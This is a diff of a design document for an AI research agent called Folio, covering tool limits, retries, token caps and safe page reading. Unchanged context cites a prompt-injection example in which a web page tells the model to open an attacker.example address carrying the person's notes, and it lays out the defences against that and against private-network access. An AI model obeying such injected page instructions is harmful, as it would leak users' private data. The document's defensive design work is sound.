@@ -65,6 +65,10 @@ A research run has only these tools. It has no thread tools, no schedule tools, 
 | `list_knowledge`, `search_knowledge`, `read_knowledge` | The existing memory tools, read only. A knowledge file that is read counts as one source. |
 | `submit_report(name, body, stop_note, sources)` | Ends the run. The sources say, for each opened source by number, one line on what it was used for. |
 
+### Which model
+
+The research loop, the page digests, and the last report call all use the one platform model that the admin has chosen, as `docs/product/models.md` says. There is no cheaper model for digests. The cost estimate below assumes this. The model interface already carries tool calls, so the loop adds no new layer. A provider whose model cannot call tools cannot run research.
+
 ### Which addresses may be opened
 
 `open_page` accepts an address only if it appeared in a search result of this run, or in the links returned for a page this run opened. The model cannot make up an address. This is the "allowed IDs" gate. It is the main defence against a page that tells the model to open `https://attacker.example/?data=<the person's notes>`: the model cannot add data to an address, so there is nothing to carry the data out. The same address opened twice counts once, and the second call returns the first digest.
@@ -85,13 +89,18 @@ The digest call is a model call and is recorded as usage. The page text is given
 | Steps of the loop | 60 | Code |
 | New pages mostly repeat | the model decides, and the stop note says so | The model |
 | Cancel | checked before each step | Code |
+| The token cap | checked before each step | Code |
 
 - A page that cannot be opened (blocked, slow, not a web page, refused by `robots.txt`) does not count toward the 20. It is told to the model so it can choose another.
-- The reading stops at 25 minutes so that the report can be written inside the 30. Cloud Tasks cannot wait for one call longer than 30 minutes, so the whole attempt must fit.
-- Time of work is the time the run was working. It adds up across retries. A retry that has too little time left is not started, and the run is marked failed.
+- A knowledge file counts as one source the first time it is read, and reading it again counts nothing. Listing and searching knowledge files count nothing. In a research run `read_knowledge` returns at most the first 12,000 characters of a file and says when it cut the text, so one large file cannot swell the loop.
+- The counters (sources, searches, and the addresses that may be opened) belong to an attempt. A retry starts them again, so the search limit is 25 for each attempt, and at most 100 over the four attempts. The shared 30 minutes and the token cap still bound the whole run.
+- A run must end with at least one source. If it opened none, for example because every page failed, no report is written. The run is marked `failed`, the thread gets one line, "I could not open any source for this question.", and it is not retried.
+- The reading stops at 25 minutes so that the report can be written inside the 30. Cloud Tasks cannot wait for one call longer than 30 minutes, so the whole attempt must fit. If the current limit is shorter, the number of minutes is one constant and shrinks with it.
+- Time of work is wall-clock time. At the end of each attempt it is added to `work_ms`, so retries cannot extend the 30 minutes. A retry that has too little time left is not started, and the run is marked failed. If the platform's time limit cuts an attempt off, the retry is answered `duplicate` while the first copy is still running, by the one-copy-at-a-time lock, so two copies never spend tokens together.
+- The token cap: it is checked before each step, with the same check as chat. When the account reaches the cap, the loop stops reading and makes one last call to write the report from what it has, so the work is not thrown away. This follows the chat rule that a call that reaches the cap finishes. The stop note says the usage limit was the reason. When the admin stops the email, no further call is made, the run is cancelled, and no report is written.
 - Cancel: the agent's `cancel_research` marks the run `cancelled`. The loop sees it before the next step and stops. The partial text is thrown away and no report is written. A report that was already ready stays. The model call in progress finishes, and its usage is recorded.
 - If the thread is deleted, or the account is stopped or reaches its cap, the run is cancelled the same way. When the account is stopped or capped, the thread gets one line saying so.
-- The failure rules are those of a scheduled run: four attempts, then `dead`, one line in the thread, and a log line with the run id.
+- The failure rules are those of a scheduled run: four attempts, then `dead`, one line in the thread, and a log line with the run id. The research service runs the same `execute` as the schedule worker, with a switch on the kind of run, so the lock, the attempt count, the result being saved once, and the stuck-run rule are shared. The tick on the schedule worker puts a research run that never reached its queue back on the research queue, and gives up on a stuck research run the same way.
 
 ## Reading a page safely (the browser)
 
@@ -101,7 +110,7 @@ The rules that protect Folio:
 
 - **Only web addresses.** `http` and `https`, on ports 80 and 443. No `file:`, `ftp:`, `chrome:`, or `data:`.
 - **No private destinations.** An address is refused when it resolves to a loopback, private, link-local, or reserved address, which includes the cloud metadata service. This is checked for the first address, for every redirect, and for every request the page makes.
-- **Checked where the connection is made.** Checking a name and then letting Chrome look it up again can be fooled by a name that changes its answer. So Chrome is started with a proxy that runs inside the same container. The proxy resolves each name itself, refuses a private result, and connects to the exact address it checked. Chrome has no other way out.
+- **Checked where the connection is made.** Checking a name and then letting Chrome look it up again can be fooled by a name that changes its answer. So Chrome is started with a proxy that runs inside the same container. The proxy resolves each name itself, refuses a private result, and connects to the exact address it checked. Chrome has no other way out. The proxy sees the destination of each connection, not the paths inside an encrypted connection, and that is enough for this rule. Rules about whole addresses, such as which pages may be opened, are applied by the tools before Chrome is asked.
 - **`robots.txt`.** Before a site is read, its `robots.txt` is read. A path that the file disallows for Folio is not opened.
 - **A plain identity.** The browser says it is Folio's research reader. It sends nothing about the account or the person.
 - **Page text is data.** The text goes into a digest call as quoted material, with no tools. The research loop sees only the digest. The run cannot write memory, threads, or schedules, so a page that tries to give orders can at worst make the report worse.
@@ -143,7 +152,7 @@ An account may have more than one research run at a time. Each run has its own t
 - A "Reports" screen, opened from the account block beside Settings. It lists the reports: name, question, time. Choosing one shows its text as Markdown, the stop note, and the source list, each source with its title, address, and one line on what it was used for. A "Download" button saves it as `name.md`.
 - Three read routes: `GET /reports`, `GET /reports/{id}`, `GET /reports/{id}/download`. No route writes a report.
 - The thread shows the working mark while a research run is working. When the run finishes, the message in the thread appears without a reload, as a scheduled result does.
-- The working indicator names the tools, for example "Searching the web" and "Reading a page".
+- The working mark is the only progress shown in this release. Showing which tool a run is using, or how many pages it has read, needs a progress record on the run and is later.
 
 ## The cloud
 
@@ -222,7 +231,14 @@ Each strategy choice is a setting on a tool Folio owns: which sites to prefer or
 - `report` has no `storage_key`, and `report_source` has no `file_id` yet.
 - A report's text is at most 100,000 characters, and its name 1 to 80.
 - Time of work adds up across retries.
-- A cancelled run writes no report, and a cancelled run because of a deleted thread or a stopped account is told in the thread only when the account is stopped.
+- A cancelled run writes no report. A run cancelled because the thread was deleted says nothing, since there is no thread. A run cancelled because the admin stopped the account puts one line in the thread.
+- The token cap does not throw work away: a run that reaches it writes one last report. The admin's stop does cancel the run.
+- One model for the loop, the digests, and the report: the one the admin chose.
+- Knowledge file reads inside a research run return at most 12,000 characters.
+- The counters belong to an attempt, so the search limit is 25 per attempt.
+- A run with no source at all is `failed`, writes no report, and is not retried.
+- The progress shown is the working mark only.
+- The research service runs the same `execute` as the schedule worker, with a switch on the run's kind.
 
 ## Left to the builder
 
